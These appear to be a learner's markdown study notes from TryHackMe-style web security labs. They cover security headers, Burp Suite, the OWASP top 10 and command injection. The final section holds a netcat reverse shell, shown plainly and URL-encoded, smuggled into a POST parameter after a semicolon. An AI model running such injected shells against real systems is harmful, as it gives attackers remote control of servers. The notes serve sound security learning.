(THB: if you cannot see a website )
```
cat /etc/systemd/resolved.conf
DNS=machineip
sudo systemctl restart systemd-resolved 
```

### Security headers: 
HTTP headers that improve the security of the web application 

Check a spesific site: https://securityheaders.com/

#### CSP: Content-Security-Policy: 
- Admins the domains or sources that are considered safe.
- Prevent XSS 

#### HSTS: Strict-Transport-Security
- Ensures the web browser always connects over HTTPS

#### X-Content-Type-Options:
- Prevent sniffing of MIME on a resource?

#### Referrer-Policy:
- Controls information being sent to a destination webserver when a user is redirected. 


Obfuscator - deobfuscator: https://obf-io.deobfuscate.io/


#### Best practices when writing webapplications:
- Avoid client side validation only
- Refrain for adding untrusted libraries 
- Never hardcode secrets 
- Minify and Obfuscate JS code
- For input fields, compare the input to a list of (un)-allowed characters, and validate the request before sending it to the server. 



#### Burp Suite:

Tips:
- Adding a specific scope in Target -> Sitemap (pick a target scope here)
- Set Scope setting to ignore traffic outside of scope
![[Pasted image 20241123212052.png]]

- We can bypass client-side filtering, example we dont get to write certain characters in a input field, by: 1. Sending some valid input, intercepting it, change post parameters to our payload(JS or something) and remember to URL encode. THEN, forward the request. 


#### OWASP top 10:
- **Broken Access Control**: User is able to access pages on a site which he is not meant to see, such as admin pages.
Example IDOR: Insecure Direct object reference, user can get access to resources you would not be able to such as another persons bank account page. 

```
http://10.10.85.194/note.php?note_id=0 , and we can change parameter: http://10.10.85.194/note.php?note_id=1 to view other users pages.
```


-  **Cryptographic Failures**: Communication done with bad implemented cryptography 

-  **Injection**: XXS and such, input fields on site can be exploited. 

-  **Insecure Design**: Stupid design, ex. we can reset another uses password.

-  **Security Misconfiguration**: Bad configuration of the site, ex. unnecessary features enabled, have existing default accounts on the site, not using HTTP security headers, etc..

-  **Vulnerable and Outdated Components**: Not updating software the site depend on, attacker can find the software version and google for exploits. 

-  **Identification and Authentication Failures**: There is possible to get credentials of other users, ex. site allows weak passwords, weak session cookies -> steal another users cookies and become them on the site. 

-  **Software and Data Integrity Failures**: Data of software can be modified because we do not validate integrity.

Site to validate integrity: https://www.srihash.org/ 
Then we can include integrity for this site in our code: 
```
<script src="https://code.jquery.com/jquery-3.6.1.min.js" integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossorigin="anonymous"></script>

```

-  **Security Logging & Monitoring Failures**: Services not logging activity on their application

-  **Server-Side Request Forgery (SSRF)**: Attacker can get the web application to send requests on their behalf.  



#### Command injection:

It can be hard to validate that a parameter on a web application in vulnerable to Command injection. 

Ex. THM Shell room:
We get info that the POST parameter "file" is vulnerable. 

file=hello.txt   - is a valid command
file=whoami   - is not a valid command 

Combining them works:
```
file=hello.txt;whoami  - is valid, and prints the user 
```

If we want to inject a shell, it can be hard to know which shell and how to inject it. What worked in this case was discovering that the user used: `\usr\sbin\nologin` as its shell, and after some reading, this results in a **struggle to spawn interactive shell sessions**. 

Q: Interactive shell vs non interactive shell?

What worked in this case:
```
Use this shell, and URL encode it:

rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f

URL encoded:
rm+-f+/tmp/f%3b+mkfifo+/tmp/f%3b+cat+/tmp/f+|+/bin/sh+-i+2>%261+|+nc+10.10.211.62+443+>/tmp/f

The whole POST parameter: 
file=hello.txt; rm+-f+/tmp/f%3b+mkfifo+/tmp/f%3b+cat+/tmp/f+|+/bin/sh+-i+2>%261+|+nc+10.10.211.62+443+>/tmp/f;

```

